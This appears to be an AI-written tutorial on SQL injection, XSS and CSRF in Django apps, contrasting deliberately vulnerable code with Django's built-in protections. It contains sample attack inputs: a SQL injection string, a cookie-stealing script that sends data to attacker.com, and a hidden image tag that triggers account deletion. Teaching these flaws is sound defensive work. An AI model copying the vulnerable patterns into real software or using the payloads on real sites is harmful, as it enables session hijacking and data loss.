> **Prompt:** Please give some real-world examples of XSS, CSRF, and SQL injection in Django apps.

Even though Django is "secure by default," it isn’t "secure by magic." If you bypass the built-in protections (like using `mark_safe` or `raw()`), you can open the door to these classic attacks.

Here are real-world scenarios of how these vulnerabilities manifest in a Django context.

---

## 1. SQL Injection (SQLi)
**The Scenario:** A search bar for a "Member Directory."
**The Mistake:** Using `Manager.raw()` or `extra()` with string formatting instead of letting Django handle the parameters.

* **Vulnerable Code:**
    ```python
    # BAD: Using string formatting in a raw query
    user_input = request.GET.get('search')
    members = Member.objects.raw(f"SELECT * FROM members_member WHERE name = '{user_input}'")
    ```
* **The Attack:** An attacker enters `' OR '1'='1` into the search bar.
* **The Result:** The query becomes `SELECT * FROM members_member WHERE name = '' OR '1'='1'`. This bypasses the name filter and returns **every single member** in the database, potentially exposing private emails or addresses.



---

## 2. Cross-Site Scripting (XSS)
**The Scenario:** A user profile page where users can write a "Bio."
**The Mistake:** Using the `|safe` filter or `mark_safe()` on user-generated content because you want to allow them to use basic HTML (like `<b>` or `<i>`).

* **Vulnerable Template:**
    ```html
    <div class="user-bio">
      {{ user.bio|safe }}
    </div>
    ```
* **The Attack:** An attacker sets their bio to:
    `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>`
* **The Result:** Whenever *another* user (like an admin) views that profile, the script runs in their browser. The attacker now has the admin's session cookie and can hijack their account.



---

## 3. Cross-Site Request Forgery (CSRF)
**The Scenario:** A "Delete My Account" button.
**The Mistake:** Disabling the `{% csrf_token %}` because it was "causing errors" with an AJAX call, or using a `GET` request to perform an action that changes state.

* **Vulnerable View:**
    ```python
    # BAD: Changing data via a GET request (very dangerous)
    def delete_account(request):
        request.user.delete()
        return redirect('/')
    ```
* **The Attack:** An attacker sends the victim an email with an innocent-looking image tag:
    `<img src="https://your-django-app.com/delete-account/" style="display:none;">`
* **The Result:** If the victim is currently logged into your site and opens that email, their browser will automatically try to load that URL. Since they are logged in, the session cookie is sent, and Django deletes their account without them ever knowing why.



---

## How Django Protects You (The "Golden Rules")

| Attack | Django's Built-in Shield | How to Break It (Don't do this!) |
| :--- | :--- | :--- |
| **SQLi** | **The ORM:** `Member.objects.filter(name=user_input)` automatically escapes inputs. | Using `.raw()` or `.extra()` with f-strings or `%` formatting. |
| **XSS** | **Auto-escaping:** Django templates treat all variables as plain text by default. | Using `|safe`, `{% autoescape off %}`, or `mark_safe()`. |
| **CSRF** | **CSRF Middleware:** Requires a secret token for every `POST` request. | Using `@csrf_exempt` or performing data changes via `GET` requests. |

---

### A Note on "Clickjacking"
While you didn't ask, Django also includes an `X-Frame-Options` header by default. This prevents attackers from putting your site inside an invisible `<iframe>` on *their* site to trick users into clicking buttons they can't see.
